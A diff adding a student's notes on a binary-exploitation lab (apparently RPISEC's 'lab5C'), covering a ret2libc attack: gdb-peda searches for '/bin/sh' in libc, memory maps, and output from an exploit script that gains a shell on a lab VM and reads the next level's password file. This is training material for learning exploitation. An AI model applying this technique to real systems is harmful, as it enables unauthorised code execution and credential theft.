@@ -1,0 +1,73 @@
+lab5c
+
+
+[+] Search for string when near ret, this allows you to see what's available at closest
+	exploit run-time
+
+
+[+] OKAY = [libc ] : 0xb7f83a24 ("/bin/sh")
+
+	"/bin/sh" is located in libc, doesn't move as ASLR isn't turned on, not on the stack
+	so it isn't adjusted runtime.
+
+
+[-] FAIL = [stack] : 0xbffff8e0 ("/bin/bash")
+
+	The stack moves and cannot land on "/bin/bash" memory address location.
+	Adjusted offsets up to 16*7 bytes inc. and 16*7 dec. No luck.
+
+[*] MAYBE = will the string on stack work if place it as a part of buffer?
+
+	"A" * (156-9)
+	"/bin/bash"
+
+gdb-peda$ find "/bin"
+Searching for '/bin' in: None ranges
+Found 12 results, display max 12 items:
+   libc : 0xb7f83a24 ("/bin/sh")		<==== YES
+   libc : 0xb7f8544b ("/bin:/usr/bin")
+   libc : 0xb7f85454 ("/bin")
+   libc : 0xb7f85988 ("/bin/csh")
+   libc : 0xb7f86e43 ("/bindresvport.blacklist")
+[stack] : 0xbffff8e0 ("/bin/bash")		<==== FAIL (stack moves)
+[stack] : 0xbffffe9b ("/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games")
+[stack] : 0xbffffeae ("/bin:/sbin:/bin:/usr/games:/usr/local/games")
+[stack] : 0xbffffeb9 ("/bin:/usr/games:/usr/local/games")
+[stack] : 0xbffffef5 ("/bin/gdb")
+[stack] : 0xbfffff96 ("/bin/lesspipe %s")
+[stack] : 0xbfffffd4 ("/bin/lesspipe %s %s")
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0x08048000 0x08049000 r-xp      /levels/lab05/lab5C
+0x08049000 0x0804a000 r--p      /levels/lab05/lab5C
+0x0804a000 0x0804b000 rw-p      /levels/lab05/lab5C
+0xb7e22000 0xb7e23000 rw-p      mapped
+0xb7e23000 0xb7fcb000 r-xp      /lib/i386-linux-gnu/libc-2.19.so <==== R_X, X
+0xb7fcb000 0xb7fcd000 r--p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7fcd000 0xb7fce000 rw-p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7fce000 0xb7fd1000 rw-p      mapped
+0xb7fd7000 0xb7fdb000 rw-p      mapped
+0xb7fdb000 0xb7fdc000 r-xp      [vdso]
+0xb7fdc000 0xb7fde000 r--p      [vvar]
+0xb7fde000 0xb7ffe000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
+0xb7ffe000 0xb7fff000 r--p      /lib/i386-linux-gnu/ld-2.19.so
+0xb7fff000 0xb8000000 rw-p      /lib/i386-linux-gnu/ld-2.19.so
+0xbffdf000 0xc0000000 rw-p      [stack]		<====== RW_, NOT X
+
+
+~/lab/rpi_mbe/MBE_release/levels/lab05# python x5C.py
+[+] Connecting to 192.168.203.146 on port 22: Done
+[*] lab5C@192.168.203.146:
+    Distro    Ubuntu 14.04
+    OS:       linux
+    Arch:     i386
+    Version:  3.16.0
+    ASLR:     Disabled
+    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
+[+] Starting remote process '/levels/lab05/./lab5C' on 192.168.203.146: pid 27570
+I included libc for you...
+Can you ROP to system()?
+
+[*] Switching to interactive mode
+$ $ cat /home/lab5B/.pass
+s0m3tim3s_r3t2libC_1s_3n0ugh
